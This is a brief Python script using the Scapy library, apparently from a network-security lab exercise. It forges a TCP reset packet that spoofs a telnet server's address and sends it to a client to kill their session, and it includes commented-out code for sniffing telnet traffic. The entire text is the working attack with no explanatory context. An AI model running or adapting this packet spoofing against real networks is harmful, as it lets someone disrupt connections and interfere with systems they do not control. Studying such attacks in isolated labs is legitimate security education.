from socket import IP_ADD_MEMBERSHIP
from scapy.all import*

IP_A = "10.9.0.5"
IP_B = "10.9.0.6"

ip  = IP(src=IP_A,dst=IP_B)
tcp = TCP(sport=23, dport=47734, flags="R", seq=3123267904)
pkt = ip/tcp
ls(pkt)
send(pkt, verbose=0)

    
#iface=['br-fd2d696261de', 'enp0s3']
#filter1 = 'tcp and port 23'
#pkt = sniff(iface = ['br-fd2d696261de'], filter=filter1, prn=print_pkt)

